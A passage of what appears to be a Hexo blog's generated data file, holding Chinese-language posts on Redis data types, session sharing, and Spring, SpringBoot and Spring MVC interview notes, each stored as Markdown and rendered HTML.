key不能重复）\nList：有序列表\nSet：无序集合（能去重）\nZSet：有序集合（能去重）\n![Redis](NoSql数据库Redis/2.png)","source":"_posts/NoSql数据库Redis.md","raw":"---\ntitle: NoSql数据库Redis\ndate: 2016-01-31 14:09:38\ntags: Redis\n---\nRedis是一个NoSql数据库，具有五中存储数据格式：\n\nString：字符串\nHash：哈希（相当于map, key不能重复）\nList：有序列表\nSet：无序集合（能去重）\nZSet：有序集合（能去重）\n![Redis](NoSql数据库Redis/2.png)","slug":"NoSql数据库Redis","published":1,"updated":"2018-01-31T06:30:28.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44twe001smfah8uzst97z","content":"<p>Redis是一个NoSql数据库，具有五中存储数据格式：</p>\n<p>String：字符串<br>Hash：哈希（相当于map, key不能重复）<br>List：有序列表<br>Set：无序集合（能去重）<br>ZSet：有序集合（能去重）<br><img src=\"NoSql数据库Redis/2.png\" alt=\"Redis\"></p>\n","site":{"data":{}},"excerpt":"","more":"<p>Redis是一个NoSql数据库，具有五中存储数据格式：</p>\n<p>String：字符串<br>Hash：哈希（相当于map, key不能重复）<br>List：有序列表<br>Set：无序集合（能去重）<br>ZSet：有序集合（能去重）<br><img src=\"NoSql数据库Redis/2.png\" alt=\"Redis\"></p>\n"},{"title":"Session共享","date":"2015-03-21T06:44:50.000Z","_content":"![Session](Session共享/1.png)\n![Session](Session共享/2.png)","source":"_posts/Session共享.md","raw":"---\ntitle: Session共享\ndate: 2015-03-21 14:44:50\ntags: Session\n---\n![Session](Session共享/1.png)\n![Session](Session共享/2.png)","slug":"Session共享","published":1,"updated":"2018-01-31T06:53:26.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44twf001umfahujh14jdf","content":"<p><img src=\"Session共享/1.png\" alt=\"Session\"><br><img src=\"Session共享/2.png\" alt=\"Session\"></p>\n","site":{"data":{}},"excerpt":"","more":"<p><img src=\"Session共享/1.png\" alt=\"Session\"><br><img src=\"Session共享/2.png\" alt=\"Session\"></p>\n"},{"title":"Solr面试准备","date":"2017-06-12T06:41:13.000Z","_content":"![Solr](Solr面试准备/1.png)","source":"_posts/Solr面试准备.md","raw":"---\ntitle: Solr面试准备\ndate: 2017-06-12 14:41:13\ntags: Solr\n---\n![Solr](Solr面试准备/1.png)","slug":"Solr面试准备","published":1,"updated":"2018-01-31T06:42:22.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44twg001wmfah1wml7efb","content":"<p><img src=\"Solr面试准备/1.png\" alt=\"Solr\"></p>\n","site":{"data":{}},"excerpt":"","more":"<p><img src=\"Solr面试准备/1.png\" alt=\"Solr\"></p>\n"},{"title":"SpringBoot入门","date":"2018-01-31T08:35:01.000Z","_content":"\n#### 认识springboot\n\n**Springboot的发展趋势**\n\nSpringboot是spring的增强版,是下一代的框架\n![SpringBoot](SpringBoot入门/1.png)\n#### 搭建springboot的入门程序\n\n**创建工程**\n![SpringBoot](SpringBoot入门/2.png)\n![SpringBoot](SpringBoot入门/3.png)\nSpringboot版本号\n![SpringBoot](SpringBoot入门/4.png)\n项目存储路径\n![SpringBoot](SpringBoot入门/5.png)\n删除三个文件\n![SpringBoot](SpringBoot入门/6.png)\nPom文件中的springboot的依赖\n![SpringBoot](SpringBoot入门/7.png)\n右键点击运行\n![SpringBoot](SpringBoot入门/8.png)\n编写一个入门程序\n![SpringBoot](SpringBoot入门/9.png)\n启动程序访问浏览器\n![SpringBoot](SpringBoot入门/10.png)\n#### 第一种项目的配置文件application.properties\n![SpringBoot](SpringBoot入门/11.png)\n**配置文件的配置说明**\n\nspringBoot项目默认端口号是8080,配置端口号:\n![SpringBoot](SpringBoot入门/12.png)\n启动访问浏览器\n![SpringBoot](SpringBoot入门/13.png)\n#### 第二种项目配置文件的方式yml的方式\n![SpringBoot](SpringBoot入门/14.png)\n浏览器访问\n![SpringBoot](SpringBoot入门/15.png)\n![SpringBoot](SpringBoot入门/16.png)\n#### 配置多个路径映射\n![SpringBoot](SpringBoot入门/17.png)\n#### 当使用rest风格的请求路径的时候获取请求参数\n![SpringBoot](SpringBoot入门/18.png)\n![SpringBoot](SpringBoot入门/19.png)\n#### 当时用传统请求时获取请求参数\n![SpringBoot](SpringBoot入门/20.png)\n\n","source":"_posts/SpringBoot入门.md","raw":"---\ntitle: SpringBoot入门\ndate: 2018-01-31 16:35:01\ntags: SpringBoot\n---\n\n#### 认识springboot\n\n**Springboot的发展趋势**\n\nSpringboot是spring的增强版,是下一代的框架\n![SpringBoot](SpringBoot入门/1.png)\n#### 搭建springboot的入门程序\n\n**创建工程**\n![SpringBoot](SpringBoot入门/2.png)\n![SpringBoot](SpringBoot入门/3.png)\nSpringboot版本号\n![SpringBoot](SpringBoot入门/4.png)\n项目存储路径\n![SpringBoot](SpringBoot入门/5.png)\n删除三个文件\n![SpringBoot](SpringBoot入门/6.png)\nPom文件中的springboot的依赖\n![SpringBoot](SpringBoot入门/7.png)\n右键点击运行\n![SpringBoot](SpringBoot入门/8.png)\n编写一个入门程序\n![SpringBoot](SpringBoot入门/9.png)\n启动程序访问浏览器\n![SpringBoot](SpringBoot入门/10.png)\n#### 第一种项目的配置文件application.properties\n![SpringBoot](SpringBoot入门/11.png)\n**配置文件的配置说明**\n\nspringBoot项目默认端口号是8080,配置端口号:\n![SpringBoot](SpringBoot入门/12.png)\n启动访问浏览器\n![SpringBoot](SpringBoot入门/13.png)\n#### 第二种项目配置文件的方式yml的方式\n![SpringBoot](SpringBoot入门/14.png)\n浏览器访问\n![SpringBoot](SpringBoot入门/15.png)\n![SpringBoot](SpringBoot入门/16.png)\n#### 配置多个路径映射\n![SpringBoot](SpringBoot入门/17.png)\n#### 当使用rest风格的请求路径的时候获取请求参数\n![SpringBoot](SpringBoot入门/18.png)\n![SpringBoot](SpringBoot入门/19.png)\n#### 当时用传统请求时获取请求参数\n![SpringBoot](SpringBoot入门/20.png)\n\n","slug":"SpringBoot入门","published":1,"updated":"2018-01-31T08:50:10.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44twi001ymfah44cerd7g","content":"<h4 id=\"认识springboot\"><a href=\"#认识springboot\" class=\"headerlink\" title=\"认识springboot\"></a>认识springboot</h4><p><strong>Springboot的发展趋势</strong></p>\n<p>Springboot是spring的增强版,是下一代的框架<br><img src=\"SpringBoot入门/1.png\" alt=\"SpringBoot\"></p>\n<h4 id=\"搭建springboot的入门程序\"><a href=\"#搭建springboot的入门程序\" class=\"headerlink\" title=\"搭建springboot的入门程序\"></a>搭建springboot的入门程序</h4><p><strong>创建工程</strong><br><img src=\"SpringBoot入门/2.png\" alt=\"SpringBoot\"><br><img src=\"SpringBoot入门/3.png\" alt=\"SpringBoot\"><br>Springboot版本号<br><img src=\"SpringBoot入门/4.png\" alt=\"SpringBoot\"><br>项目存储路径<br><img src=\"SpringBoot入门/5.png\" alt=\"SpringBoot\"><br>删除三个文件<br><img src=\"SpringBoot入门/6.png\" alt=\"SpringBoot\"><br>Pom文件中的springboot的依赖<br><img src=\"SpringBoot入门/7.png\" alt=\"SpringBoot\"><br>右键点击运行<br><img src=\"SpringBoot入门/8.png\" alt=\"SpringBoot\"><br>编写一个入门程序<br><img src=\"SpringBoot入门/9.png\" alt=\"SpringBoot\"><br>启动程序访问浏览器<br><img src=\"SpringBoot入门/10.png\" alt=\"SpringBoot\"></p>\n<h4 id=\"第一种项目的配置文件application-properties\"><a href=\"#第一种项目的配置文件application-properties\" class=\"headerlink\" title=\"第一种项目的配置文件application.properties\"></a>第一种项目的配置文件application.properties</h4><p><img src=\"SpringBoot入门/11.png\" alt=\"SpringBoot\"><br><strong>配置文件的配置说明</strong></p>\n<p>springBoot项目默认端口号是8080,配置端口号:<br><img src=\"SpringBoot入门/12.png\" alt=\"SpringBoot\"><br>启动访问浏览器<br><img src=\"SpringBoot入门/13.png\" alt=\"SpringBoot\"></p>\n<h4 id=\"第二种项目配置文件的方式yml的方式\"><a href=\"#第二种项目配置文件的方式yml的方式\" class=\"headerlink\" title=\"第二种项目配置文件的方式yml的方式\"></a>第二种项目配置文件的方式yml的方式</h4><p><img src=\"SpringBoot入门/14.png\" alt=\"SpringBoot\"><br>浏览器访问<br><img src=\"SpringBoot入门/15.png\" alt=\"SpringBoot\"><br><img src=\"SpringBoot入门/16.png\" alt=\"SpringBoot\"></p>\n<h4 id=\"配置多个路径映射\"><a href=\"#配置多个路径映射\" class=\"headerlink\" title=\"配置多个路径映射\"></a>配置多个路径映射</h4><p><img src=\"SpringBoot入门/17.png\" alt=\"SpringBoot\"></p>\n<h4 id=\"当使用rest风格的请求路径的时候获取请求参数\"><a href=\"#当使用rest风格的请求路径的时候获取请求参数\" class=\"headerlink\" title=\"当使用rest风格的请求路径的时候获取请求参数\"></a>当使用rest风格的请求路径的时候获取请求参数</h4><p><img src=\"SpringBoot入门/18.png\" alt=\"SpringBoot\"><br><img src=\"SpringBoot入门/19.png\" alt=\"SpringBoot\"></p>\n<h4 id=\"当时用传统请求时获取请求参数\"><a href=\"#当时用传统请求时获取请求参数\" class=\"headerlink\" title=\"当时用传统请求时获取请求参数\"></a>当时用传统请求时获取请求参数</h4><p><img src=\"SpringBoot入门/20.png\" alt=\"SpringBoot\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"认识springboot\"><a href=\"#认识springboot\" class=\"headerlink\" title=\"认识springboot\"></a>认识springboot</h4><p><strong>Springboot的发展趋势</strong></p>\n<p>Springboot是spring的增强版,是下一代的框架<br><img src=\"SpringBoot入门/1.png\" alt=\"SpringBoot\"></p>\n<h4 id=\"搭建springboot的入门程序\"><a href=\"#搭建springboot的入门程序\" class=\"headerlink\" title=\"搭建springboot的入门程序\"></a>搭建springboot的入门程序</h4><p><strong>创建工程</strong><br><img src=\"SpringBoot入门/2.png\" alt=\"SpringBoot\"><br><img src=\"SpringBoot入门/3.png\" alt=\"SpringBoot\"><br>Springboot版本号<br><img src=\"SpringBoot入门/4.png\" alt=\"SpringBoot\"><br>项目存储路径<br><img src=\"SpringBoot入门/5.png\" alt=\"SpringBoot\"><br>删除三个文件<br><img src=\"SpringBoot入门/6.png\" alt=\"SpringBoot\"><br>Pom文件中的springboot的依赖<br><img src=\"SpringBoot入门/7.png\" alt=\"SpringBoot\"><br>右键点击运行<br><img src=\"SpringBoot入门/8.png\" alt=\"SpringBoot\"><br>编写一个入门程序<br><img src=\"SpringBoot入门/9.png\" alt=\"SpringBoot\"><br>启动程序访问浏览器<br><img src=\"SpringBoot入门/10.png\" alt=\"SpringBoot\"></p>\n<h4 id=\"第一种项目的配置文件application-properties\"><a href=\"#第一种项目的配置文件application-properties\" class=\"headerlink\" title=\"第一种项目的配置文件application.properties\"></a>第一种项目的配置文件application.properties</h4><p><img src=\"SpringBoot入门/11.png\" alt=\"SpringBoot\"><br><strong>配置文件的配置说明</strong></p>\n<p>springBoot项目默认端口号是8080,配置端口号:<br><img src=\"SpringBoot入门/12.png\" alt=\"SpringBoot\"><br>启动访问浏览器<br><img src=\"SpringBoot入门/13.png\" alt=\"SpringBoot\"></p>\n<h4 id=\"第二种项目配置文件的方式yml的方式\"><a href=\"#第二种项目配置文件的方式yml的方式\" class=\"headerlink\" title=\"第二种项目配置文件的方式yml的方式\"></a>第二种项目配置文件的方式yml的方式</h4><p><img src=\"SpringBoot入门/14.png\" alt=\"SpringBoot\"><br>浏览器访问<br><img src=\"SpringBoot入门/15.png\" alt=\"SpringBoot\"><br><img src=\"SpringBoot入门/16.png\" alt=\"SpringBoot\"></p>\n<h4 id=\"配置多个路径映射\"><a href=\"#配置多个路径映射\" class=\"headerlink\" title=\"配置多个路径映射\"></a>配置多个路径映射</h4><p><img src=\"SpringBoot入门/17.png\" alt=\"SpringBoot\"></p>\n<h4 id=\"当使用rest风格的请求路径的时候获取请求参数\"><a href=\"#当使用rest风格的请求路径的时候获取请求参数\" class=\"headerlink\" title=\"当使用rest风格的请求路径的时候获取请求参数\"></a>当使用rest风格的请求路径的时候获取请求参数</h4><p><img src=\"SpringBoot入门/18.png\" alt=\"SpringBoot\"><br><img src=\"SpringBoot入门/19.png\" alt=\"SpringBoot\"></p>\n<h4 id=\"当时用传统请求时获取请求参数\"><a href=\"#当时用传统请求时获取请求参数\" class=\"headerlink\" title=\"当时用传统请求时获取请求参数\"></a>当时用传统请求时获取请求参数</h4><p><img src=\"SpringBoot入门/20.png\" alt=\"SpringBoot\"></p>\n"},{"title":"Springmvc面试总结","date":"2017-12-11T15:59:49.000Z","_content":"#### 什么是Springmvc\n&emsp;&emsp;Springmvc是表现层(web层)的一个MVC框架,是Spring的一部分\n\n#### Springmvc在B/S中的架构图\n![Springmvc](Springmvc面试总结/1.png)\n#### Springmvc的架构图\n![Springmvc](Springmvc面试总结/2.png)\n![Springmvc](Springmvc面试总结/3.png)\n#### Springmvc怎么处理返回值\n&emsp;&emsp;封装为ModelAndView或者直接返回字符串\n#### Springmvc,Struts2,Strruts1的入口分别是什么\n&emsp;&emsp;Springmvc是DispatcherServlet,Struts2是strutsPrepareAndExcutFilter,Struts1是ActionServlet\n\n#### Struts2与Springmvc的区别\n&emsp;&emsp;1.Struts2前端控制器是一个Filter,Springmvc的前端控制器是一个Servlet\n&emsp;&emsp;2.Struts2用成员变量接收参数,所以是多例模式的,Springmvc用形式参数进行参数绑定,所以是单利的\n&emsp;&emsp;3.Struts2存取值是通过值栈和OGNL表达式,Springmvc是进行参数绑定\n&emsp;&emsp;4.Struts2是基于类进行开发的,Springmvc是基于方法进行开发的\n\n#### 前端框架有了Struts2为什么还需要Springmvc\n&emsp;&emsp;1.从运行效率上来讲,Struts2和Springmvc是没有多大差异的,只是Springmvc比Struts2开发效率要高\n&emsp;&emsp;2.struts2在开发的历程中暴露出来了一些安全性的问题\n&emsp;&emsp;3.struts2和springmvc并没有什么相对的概念,就好比有了百事可乐,可口可乐也依然存在一样,两者并不矛盾","source":"_posts/Springmvc面试总结.md","raw":"---\ntitle: Springmvc面试总结\ndate: 2017-12-11 23:59:49\ntags: Springmvc\n---\n#### 什么是Springmvc\n&emsp;&emsp;Springmvc是表现层(web层)的一个MVC框架,是Spring的一部分\n\n#### Springmvc在B/S中的架构图\n![Springmvc](Springmvc面试总结/1.png)\n#### Springmvc的架构图\n![Springmvc](Springmvc面试总结/2.png)\n![Springmvc](Springmvc面试总结/3.png)\n#### Springmvc怎么处理返回值\n&emsp;&emsp;封装为ModelAndView或者直接返回字符串\n#### Springmvc,Struts2,Strruts1的入口分别是什么\n&emsp;&emsp;Springmvc是DispatcherServlet,Struts2是strutsPrepareAndExcutFilter,Struts1是ActionServlet\n\n#### Struts2与Springmvc的区别\n&emsp;&emsp;1.Struts2前端控制器是一个Filter,Springmvc的前端控制器是一个Servlet\n&emsp;&emsp;2.Struts2用成员变量接收参数,所以是多例模式的,Springmvc用形式参数进行参数绑定,所以是单利的\n&emsp;&emsp;3.Struts2存取值是通过值栈和OGNL表达式,Springmvc是进行参数绑定\n&emsp;&emsp;4.Struts2是基于类进行开发的,Springmvc是基于方法进行开发的\n\n#### 前端框架有了Struts2为什么还需要Springmvc\n&emsp;&emsp;1.从运行效率上来讲,Struts2和Springmvc是没有多大差异的,只是Springmvc比Struts2开发效率要高\n&emsp;&emsp;2.struts2在开发的历程中暴露出来了一些安全性的问题\n&emsp;&emsp;3.struts2和springmvc并没有什么相对的概念,就好比有了百事可乐,可口可乐也依然存在一样,两者并不矛盾","slug":"Springmvc面试总结","published":1,"updated":"2018-01-31T05:28:32.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44twi001zmfah5azodua4","content":"<h4 id=\"什么是Springmvc\"><a href=\"#什么是Springmvc\" class=\"headerlink\" title=\"什么是Springmvc\"></a>什么是Springmvc</h4><p>&emsp;&emsp;Springmvc是表现层(web层)的一个MVC框架,是Spring的一部分</p>\n<h4 id=\"Springmvc在B-S中的架构图\"><a href=\"#Springmvc在B-S中的架构图\" class=\"headerlink\" title=\"Springmvc在B/S中的架构图\"></a>Springmvc在B/S中的架构图</h4><p><img src=\"Springmvc面试总结/1.png\" alt=\"Springmvc\"></p>\n<h4 id=\"Springmvc的架构图\"><a href=\"#Springmvc的架构图\" class=\"headerlink\" title=\"Springmvc的架构图\"></a>Springmvc的架构图</h4><p><img src=\"Springmvc面试总结/2.png\" alt=\"Springmvc\"><br><img src=\"Springmvc面试总结/3.png\" alt=\"Springmvc\"></p>\n<h4 id=\"Springmvc怎么处理返回值\"><a href=\"#Springmvc怎么处理返回值\" class=\"headerlink\" title=\"Springmvc怎么处理返回值\"></a>Springmvc怎么处理返回值</h4><p>&emsp;&emsp;封装为ModelAndView或者直接返回字符串</p>\n<h4 id=\"Springmvc-Struts2-Strruts1的入口分别是什么\"><a href=\"#Springmvc-Struts2-Strruts1的入口分别是什么\" class=\"headerlink\" title=\"Springmvc,Struts2,Strruts1的入口分别是什么\"></a>Springmvc,Struts2,Strruts1的入口分别是什么</h4><p>&emsp;&emsp;Springmvc是DispatcherServlet,Struts2是strutsPrepareAndExcutFilter,Struts1是ActionServlet</p>\n<h4 id=\"Struts2与Springmvc的区别\"><a href=\"#Struts2与Springmvc的区别\" class=\"headerlink\" title=\"Struts2与Springmvc的区别\"></a>Struts2与Springmvc的区别</h4><p>&emsp;&emsp;1.Struts2前端控制器是一个Filter,Springmvc的前端控制器是一个Servlet<br>&emsp;&emsp;2.Struts2用成员变量接收参数,所以是多例模式的,Springmvc用形式参数进行参数绑定,所以是单利的<br>&emsp;&emsp;3.Struts2存取值是通过值栈和OGNL表达式,Springmvc是进行参数绑定<br>&emsp;&emsp;4.Struts2是基于类进行开发的,Springmvc是基于方法进行开发的</p>\n<h4 id=\"前端框架有了Struts2为什么还需要Springmvc\"><a href=\"#前端框架有了Struts2为什么还需要Springmvc\" class=\"headerlink\" title=\"前端框架有了Struts2为什么还需要Springmvc\"></a>前端框架有了Struts2为什么还需要Springmvc</h4><p>&emsp;&emsp;1.从运行效率上来讲,Struts2和Springmvc是没有多大差异的,只是Springmvc比Struts2开发效率要高<br>&emsp;&emsp;2.struts2在开发的历程中暴露出来了一些安全性的问题<br>&emsp;&emsp;3.struts2和springmvc并没有什么相对的概念,就好比有了百事可乐,可口可乐也依然存在一样,两者并不矛盾</p>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"什么是Springmvc\"><a href=\"#什么是Springmvc\" class=\"headerlink\" title=\"什么是Springmvc\"></a>什么是Springmvc</h4><p>&emsp;&emsp;Springmvc是表现层(web层)的一个MVC框架,是Spring的一部分</p>\n<h4 id=\"Springmvc在B-S中的架构图\"><a href=\"#Springmvc在B-S中的架构图\" class=\"headerlink\" title=\"Springmvc在B/S中的架构图\"></a>Springmvc在B/S中的架构图</h4><p><img src=\"Springmvc面试总结/1.png\" alt=\"Springmvc\"></p>\n<h4 id=\"Springmvc的架构图\"><a href=\"#Springmvc的架构图\" class=\"headerlink\" title=\"Springmvc的架构图\"></a>Springmvc的架构图</h4><p><img src=\"Springmvc面试总结/2.png\" alt=\"Springmvc\"><br><img src=\"Springmvc面试总结/3.png\" alt=\"Springmvc\"></p>\n<h4 id=\"Springmvc怎么处理返回值\"><a href=\"#Springmvc怎么处理返回值\" class=\"headerlink\" title=\"Springmvc怎么处理返回值\"></a>Springmvc怎么处理返回值</h4><p>&emsp;&emsp;封装为ModelAndView或者直接返回字符串</p>\n<h4 id=\"Springmvc-Struts2-Strruts1的入口分别是什么\"><a href=\"#Springmvc-Struts2-Strruts1的入口分别是什么\" class=\"headerlink\" title=\"Springmvc,Struts2,Strruts1的入口分别是什么\"></a>Springmvc,Struts2,Strruts1的入口分别是什么</h4><p>&emsp;&emsp;Springmvc是DispatcherServlet,Struts2是strutsPrepareAndExcutFilter,Struts1是ActionServlet</p>\n<h4 id=\"Struts2与Springmvc的区别\"><a href=\"#Struts2与Springmvc的区别\" class=\"headerlink\" title=\"Struts2与Springmvc的区别\"></a>Struts2与Springmvc的区别</h4><p>&emsp;&emsp;1.Struts2前端控制器是一个Filter,Springmvc的前端控制器是一个Servlet<br>&emsp;&emsp;2.Struts2用成员变量接收参数,所以是多例模式的,Springmvc用形式参数进行参数绑定,所以是单利的<br>&emsp;&emsp;3.Struts2存取值是通过值栈和OGNL表达式,Springmvc是进行参数绑定<br>&emsp;&emsp;4.Struts2是基于类进行开发的,Springmvc是基于方法进行开发的</p>\n<h4 id=\"前端框架有了Struts2为什么还需要Springmvc\"><a href=\"#前端框架有了Struts2为什么还需要Springmvc\" class=\"headerlink\" title=\"前端框架有了Struts2为什么还需要Springmvc\"></a>前端框架有了Struts2为什么还需要Springmvc</h4><p>&emsp;&emsp;1.从运行效率上来讲,Struts2和Springmvc是没有多大差异的,只是Springmvc比Struts2开发效率要高<br>&emsp;&emsp;2.struts2在开发的历程中暴露出来了一些安全性的问题<br>&emsp;&emsp;3.struts2和springmvc并没有什么相对的概念,就好比有了百事可乐,可口可乐也依然存在一样,两者并不矛盾</p>\n"},{"title":"Spring面试总结","date":"2017-04-23T03:33:50.000Z","_content":"#### 什么是Spring\n![什么是Spring](Spring面试总结/1.png)\n![什么是Spring](Spring面试总结/2.png)\n#### Spring控制反转IOC\n![什么是Spring](Spring面试总结/3.png)\n![什么是Spring](Spring面试总结/4.png)\n#### Spring的依赖注入DI\n&emsp;&emsp;应用程序依赖Spring为其注入资源叫做依赖注入.当Spring为Bean注入属性的时候，基本数据类型，基本数据类型包装类，String用的是value，其他的引用数据类型用的是ref\n#### IOC和DI之间的关系\n![什么是Spring](Spring面试总结/5.png)\n#### ApplicationContex与BeanFactory之间的关系\n&emsp;&emsp;getBean方法其实是在BeanFactory中,applicationContext初始化Bean的对象默认情况下是立即加载，\n&emsp;&emsp;BeanFactory初始化Bean默认的情况下是延迟加载，只有用到Bean的时候才会初始化对象.applicationContext是BeanFactory的子接口,功能比BeanFactory更加强大\n\n![什么是Spring](Spring面试总结/6.png)\n\n#### Spring中Bean的初始化\n1.构造器初始化,需要一个无参数的构造器\n2.静态工厂初始化\n\n\t<bean factory-method=”” class=””></bean>\n3.实例工厂初始化\n\n\t<bean factory-method=”” factory-bean=””></bean>\n\n#### Spring创建出对象的五种状态（Scope属性）\n![什么是Spring](Spring面试总结/7.png)\n\n#### Spring中Bean的生命周期\n&emsp;&emsp;如果Bean是单利的（Spring默认的配置方式），则只初始化初始化一次，不会消亡，只有当Spring的IOC容器关闭的时候才会销毁Bean对象\n如果Bean是非单利的，则Bean对象不由Spring的IOC容器管理，由JVM的垃圾回收机制收回，创建的时候，每次使用都会创建一个新的对象\n\n#### Spring的属性注入\n&emsp;&emsp;Autowired默认是按照类型进行注入的\n当Autowired + Qualifier(“name”) 是按照名称进行注入，其中name必须写\n\n#### 面向切面编程AOP理解\n&emsp;&emsp;AOP是一种编程范式，由AOP联盟提出用来弥补oop的不足。传统的oop关注的是纵向编程，而AOP关注的是将同一层面上共性的部分抽取出来形成独立的模块，\n&emsp;&emsp;在程序的执行阶段又动态的添加进去，组成完整的业务代码。\n\n#### AOP的基本概念\n**目标类:**\n&emsp;&emsp;需要被增强的类（原始类）叫做目标类，由目标类创建的对象叫做目标对象\n**连接点:**\n&emsp;&emsp;目标类中所有的方法（的执行）叫做连接点\n**切入点:**\n&emsp;&emsp;目标类中具有共性功能的方法（的执行）叫做切入点\n**通知:**\n&emsp;&emsp;将共性功能抽取到一个类中叫做通知类，共性模块叫做通知\n**AOP代理:**\n&emsp;&emsp;抽取后的类创建的对象不能在完成相应的功能，这时候就需要创建一个AOP代理对象完成完整的业务功能，创建AOP代理对象的过程叫做AOP代理\n**织入:**\n&emsp;&emsp;将增强的共性功能添加到切入点的过程叫做织入\n**织入的时机:**\n![什么是Spring](Spring面试总结/8.png)\n**切面:**\n&emsp;&emsp;通知和切入点之间的对应关系叫做切面（从数学的角度点与点之间的连线形成线，多条线形成面\n\n#### 面向切面配置\n![什么是Spring](Spring面试总结/9.png)\n#### AOP通知的5种类型\n![什么是Spring](Spring面试总结/10.png)\n\n\n\n\n\n\n\n\n\n","source":"_posts/Spring面试总结.md","raw":"---\ntitle: Spring面试总结\ndate: 2017-4-23 11:33:50\ntags: Spring\n---\n#### 什么是Spring\n![什么是Spring](Spring面试总结/1.png)\n![什么是Spring](Spring面试总结/2.png)\n#### Spring控制反转IOC\n![什么是Spring](Spring面试总结/3.png)\n![什么是Spring](Spring面试总结/4.png)\n#### Spring的依赖注入DI\n&emsp;&emsp;应用程序依赖Spring为其注入资源叫做依赖注入.当Spring为Bean注入属性的时候，基本数据类型，基本数据类型包装类，String用的是value，其他的引用数据类型用的是ref\n#### IOC和DI之间的关系\n![什么是Spring](Spring面试总结/5.png)\n#### ApplicationContex与BeanFactory之间的关系\n&emsp;&emsp;getBean方法其实是在BeanFactory中,applicationContext初始化Bean的对象默认情况下是立即加载，\n&emsp;&emsp;BeanFactory初始化Bean默认的情况下是延迟加载，只有用到Bean的时候才会初始化对象.applicationContext是BeanFactory的子接口,功能比BeanFactory更加强大\n\n![什么是Spring](Spring面试总结/6.png)\n\n#### Spring中Bean的初始化\n1.构造器初始化,需要一个无参数的构造器\n2.静态工厂初始化\n\n\t<bean factory-method=”” class=””></bean>\n3.实例工厂初始化\n\n\t<bean factory-method=”” factory-bean=””></bean>\n\n#### Spring创建出对象的五种状态（Scope属性）\n![什么是Spring](Spring面试总结/7.png)\n\n#### Spring中Bean的生命周期\n&emsp;&emsp;如果Bean是单利的（Spring默认的配置方式），则只初始化初始化一次，不会消亡，只有当Spring的IOC容器关闭的时候才会销毁Bean对象\n如果Bean是非单利的，则Bean对象不由Spring的IOC容器管理，由JVM的垃圾回收机制收回，创建的时候，每次使用都会创建一个新的对象\n\n#### Spring的属性注入\n&emsp;&emsp;Autowired默认是按照类型进行注入的\n当Autowired + Qualifier(“name”) 是按照名称进行注入，其中name必须写\n\n#### 面向切面编程AOP理解\n&emsp;&emsp;AOP是一种编程范式，由AOP联盟提出用来弥补oop的不足。传统的oop关注的是纵向编程，而AOP关注的是将同一层面上共性的部分抽取出来形成独立的模块，\n&emsp;&emsp;在程序的执行阶段又动态的添加进去，组成完整的业务代码。\n\n#### AOP的基本概念\n**目标类:**\n&emsp;&emsp;需要被增强的类（原始类）叫做目标类，由目标类创建的对象叫做目标对象\n**连接点:**\n&emsp;&emsp;目标类中所有的方法（的执行）叫做连接点\n**切入点:**\n&emsp;&emsp;目标类中具有共性功能的方法（的执行）叫做切入点\n**通知:**\n&emsp;&emsp;将共性功能抽取到一个类中叫做通知类，共性模块叫做通知\n**AOP代理:**\n&emsp;&emsp;抽取后的类创建的对象不能在完成相应的功能，这时候就需要创建一个AOP代理对象完成完整的业务功能，创建AOP代理对象的过程叫做AOP代理\n**织入:**\n&emsp;&emsp;将增强的共性功能添加到切入点的过程叫做织入\n**织入的时机:**\n![什么是Spring](Spring面试总结/8.png)\n**切面:**\n&emsp;&emsp;通知和切入点之间的对应关系叫做切面（从数学的角度点与点之间的连线形成线，多条线形成面\n\n#### 面向切面配置\n![什么是Spring](Spring面试总结/9.png)\n#### AOP通知的5种类型\n![什么是Spring](Spring面试总结/10.png)\n\n\n\n\n\n\n\n\n\n","slug":"Spring面试总结","published":1,"updated":"2018-01-31T05:26:04.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44twj0022mfahgdlp4bf1","content":"<h4 id=\"什么是Spring\"><a href=\"#什么是Spring\" class=\"headerlink\" title=\"什么是Spring\"></a>什么是Spring</h4><p><img src=\"Spring面试总结/1.png\" alt=\"什么是Spring\"><br><img src=\"Spring面试总结/2.png\" alt=\"什么是Spring\"></p>\n<h4 id=\"Spring控制反转IOC\"><a href=\"#Spring控制反转IOC\" class=\"headerlink\" title=\"Spring控制反转IOC\"></a>Spring控制反转IOC</h4><p><img src=\"Spring面试总结/3.png\" alt=\"什么是Spring\"><br><img src=\"Spring面试总结/4.png\" alt=\"什么是Spring\"></p>\n<h4 id=\"Spring的依赖注入DI\"><a href=\"#Spring的依赖注入DI\" class=\"headerlink\" title=\"Spring的依赖注入DI\"></a>Spring的依赖注入DI</h4><p>&emsp;&emsp;应用程序依赖Spring为其注入资源叫做依赖注入.当Spring为Bean注入属性的时候，基本数据类型，基本数据类型包装类，String用的是value，其他的引用数据类型用的是ref</p>\n<h4 id=\"IOC和DI之间的关系\"><a href=\"#IOC和DI之间的关系\" class=\"headerlink\" title=\"IOC和DI之间的关系\"></a>IOC和DI之间的关系</h4><p><img src=\"Spring面试总结/5.png\" alt=\"什么是Spring\"></p>\n<h4 id=\"ApplicationContex与BeanFactory之间的关系\"><a href=\"#ApplicationContex与BeanFactory之间的关系\" class=\"headerlink\" title=\"ApplicationContex与BeanFactory之间的关系\"></a>ApplicationContex与BeanFactory之间的关系</h4><p>&emsp;&emsp;getBean方法其实是在BeanFactory中,applicationContext初始化Bean的对象默认情况下是立即加载，<br>&emsp;&emsp;BeanFactory初始化Bean默认的情况下是延迟加载，只有用到Bean的时候才会初始化对象.applicationContext是BeanFactory的子接口,功能比BeanFactory更加强大</p>\n<p><img src=\"Spring面试总结/6.png\" alt=\"什么是Spring\"></p>\n<h4 id=\"Spring中Bean的初始化\"><a href=\"#Spring中Bean的初始化\" class=\"headerlink\" title=\"Spring中Bean的初始化\"></a>Spring中Bean的初始化</h4><p>1.构造器初始化,需要一个无参数的构造器<br>2.静态工厂初始化</p>\n<pre><code>&lt;bean factory-method=”” class=””&gt;&lt;/bean&gt;\n</code></pre><p>3.实例工厂初始化</p>\n<pre><code>&lt;bean factory-method=”” factory-bean=””&gt;&lt;/bean&gt;\n</code></pre><h4 id=\"Spring创建出对象的五种状态（Scope属性）\"><a href=\"#Spring创建出对象的五种状态（Scope属性）\" class=\"headerlink\" 